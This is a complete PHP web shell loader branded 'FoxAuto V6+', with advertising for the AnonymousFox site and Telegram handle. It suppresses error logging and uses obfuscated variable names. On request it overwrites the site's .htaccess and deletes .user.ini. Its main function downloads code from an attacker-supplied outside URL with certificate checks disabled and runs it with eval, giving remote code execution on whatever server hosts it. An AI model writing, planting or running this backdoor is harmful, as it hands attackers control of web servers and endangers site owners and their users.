<?php

error_reporting(E_ALL ^ E_NOTICE);
 error_reporting(0); function Momdo($T1R7y) { $CyJ4O = strlen(trim($T1R7y)); $yB2qC = ''; for ($srffE = 0; $srffE < $CyJ4O; $srffE += 2) { $yB2qC .= pack("C", hexdec(substr($T1R7y, $srffE, 2))); } return $yB2qC; } 
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
echo 'FoxAuto V6+<br>Download: anonymousfox.com | <script type=\'text/javascript\'>document.write(unescape(\'%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%6E%65%74\'))</script> | anonymousfox.info     <br>Telegram: @Anonymous_Fox
';
if (isset($_GET['403'])) {
    $PvDde = base64_decode('IyBCRUdJTgo8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4KUmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleC5waHAkIC0gW0xdClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1mClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kClJld3JpdGVSdWxlIC4gaW5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgojIEVORAo=');
    $dt68w = $_SERVER['DOCUMENT_ROOT'];
    unlink("{$dt68w}/.htaccess");
    if (function_exists('file_put_contents')) {
        file_put_contents("{$dt68w}/.htaccess", $PvDde);
    } else {
        fwrite(fopen("{$dt68w}/.htaccess", 'w'), $PvDde);
    }
    if (file_exists("{$dt68w}/.user.ini")) {
        unlink("{$dt68w}/.user.ini");
    }
}
function curlFoxAuto($d15uw)
{
    $Au0oE = curl_init();
    curl_setopt($Au0oE, CURLOPT_TIMEOUT, 30);
    curl_setopt($Au0oE, CURLOPT_RETURNTRANSFER, !0);
    curl_setopt($Au0oE, CURLOPT_URL, $d15uw);
    curl_setopt($Au0oE, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0;WOW64;rv:43.0) Gecko/20100101 Firefox/43.0');
    curl_setopt($Au0oE, CURLOPT_FOLLOWLOCATION, !0);
    if (stristr($d15uw, 'https://')) {
        curl_setopt($Au0oE, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($Au0oE, CURLOPT_SSL_VERIFYHOST, 0);
    }
    curl_setopt($Au0oE, CURLOPT_HEADER, !1);
    return curl_exec($Au0oE);
}
$PmArP = 'http://' . $_GET['php'];
if (empty($_GET['php'])) {
    exit;
} else {
    $pOXsz = file_get_contents($PmArP);
    if (empty($pOXsz)) {
        $pOXsz = curlFoxAuto($PmArP);
    }
    $pOXsz = str_replace('<?php', '', $pOXsz);
    $pOXsz = str_replace('?>', '', $pOXsz);
    eval($pOXsz);
	 
}
$tV = "<token>000000000</token>"; /* FoxAuto */